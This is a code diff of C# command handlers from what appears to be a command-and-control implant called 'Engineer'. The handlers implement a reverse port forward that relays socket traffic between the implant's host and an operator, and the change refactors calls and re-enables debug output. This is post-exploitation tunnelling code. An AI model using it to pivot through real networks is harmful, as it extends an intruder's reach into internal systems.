@@ -1,15 +1,13 @@
-﻿using Engineer.Commands;
-using Engineer.Functions;
-using Engineer.Models;
-using System;
+﻿using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
-using System.Linq;
 using System.Net;
 using System.Net.Sockets;
-using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using DynamicEngLoading;
+using Engineer.Functions;
+
 
 namespace Engineer.Commands
 {
@@ -27,9 +25,9 @@ namespace Engineer.Commands
             task.Arguments.TryGetValue("/client", out var client);
             bindport = bindport.TrimStart(' ');
             client = client.TrimStart(' ');
-            rportForward.rPortClientData.TryAdd(client, new ConcurrentQueue<byte[]>());
+            rPortClientData.TryAdd(client, new ConcurrentQueue<byte[]>());
             Task.Run(async ()=> await HandleSendRecive(bindport,client));
-            Tasking.FillTaskResults("Starting Reverse Port Forward on engineers host at port " + bindport, task, EngTaskStatus.Running,TaskResponseType.String);
+            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Starting Reverse Port Forward on engineers host at port " + bindport, task, EngTaskStatus.Running,TaskResponseType.String);
         }
 
         private static async Task HandleSendRecive(string bindPort, string client)
@@ -45,10 +43,10 @@ namespace Engineer.Commands
                     // if destination is connected, then check the queue for data and send it to the destination
                     if (destination.Connected)
                     {
-                        //Console.WriteLine("Destination connected");
+                        Console.WriteLine("Destination connected");
                         if (rPortClientData[client].TryDequeue(out var dataToRecieve))
                         {
-                            //Console.WriteLine("Sending data to destination");
+                            Console.WriteLine("Sending data to destination");
                             await destination.SendData(dataToRecieve, _tokenSource.Token);
                         }
                         //if destionation has data to read, take it and run a rportRecieve command to send it off to the ts
@@ -74,8 +72,8 @@ namespace Engineer.Commands
             }
             catch (Exception ex)
             {
-                //Console.WriteLine(ex.Message);
-                //Console.WriteLine(ex.StackTrace);
+                Console.WriteLine(ex.Message);
+                Console.WriteLine(ex.StackTrace);
             }
         }
     }
@@ -98,7 +96,7 @@ namespace Engineer.Commands
                 rportForward.rPortClientData.TryAdd(client, new ConcurrentQueue<byte[]>());
                 rportForward.rPortClientData[client].Enqueue(task.File);
             }
-            Tasking.FillTaskResults("Data queued for client",task,EngTaskStatus.Complete,TaskResponseType.String);
+            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Data queued for client",task,EngTaskStatus.Complete,TaskResponseType.String);
 
         }
     }
@@ -112,7 +110,7 @@ namespace Engineer.Commands
         {
             task.Arguments.TryGetValue("/client", out string client);
             var data = task.File;
-            Tasking.FillTaskResults(Convert.ToBase64String(data) + "\n" + client,task,EngTaskStatus.Complete,TaskResponseType.String);
+            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(Convert.ToBase64String(data) + "\n" + client,task,EngTaskStatus.Complete,TaskResponseType.String);
         }
     }
     
